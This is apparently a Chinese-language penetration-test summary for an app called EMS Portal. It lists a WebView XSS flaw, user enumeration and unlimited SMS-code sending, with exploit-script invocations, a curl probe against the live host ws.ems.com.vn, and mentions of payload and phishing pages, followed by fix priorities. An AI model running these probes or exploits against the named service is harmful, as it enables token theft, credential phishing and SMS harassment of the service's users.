# EMS Portal - 无需Token攻击总结

## 🔥 发现的漏洞

### 1. WebView XSS/RCE (最严重!)
**CVSS: 9.3 (CRITICAL)**

位置: FollowDriverOnMapActivity
问题: 直接从Intent加载URL，无任何验证，JS已启用

利用: python3 webview_exploit.py --ip YOUR_IP

影响:
- 窃取LocalStorage (Token)
- 读取本地文件
- 钓鱼获取凭证
- 完全控制应用

### 2. 用户枚举
端点: /auth/login, /api/v1/forgot-password
问题: 返回不同错误信息区分用户存在/不存在

### 3. 短信轰炸
端点: /rc/send-confirmation-code
问题: 无速率限制，可无限发送验证码

## 快速测试

# WebView XSS
python3 webview_exploit.py --ip 192.168.1.100

# 用户枚举
curl -X POST http://ws.ems.com.vn/auth/login \
  -H "Content-Type: application/json" \
  -d '{"phone":"0123456789","password":"test"}'

## 关键文件

- NO_TOKEN_EXPLOITS.md - 详细分析
- webview_exploit.py - 自动化工具
- payload.html - XSS payload (自动生成)
- phishing.html - 钓鱼页面 (可选)

## 修复优先级

P0 (立即修复):
  1. WebView URL白名单验证
  2. 禁用JavaScript (如非必要)

P1 (7天内):
  3. 统一登录错误信息
  4. 实施速率限制

所有漏洞均无需Token!
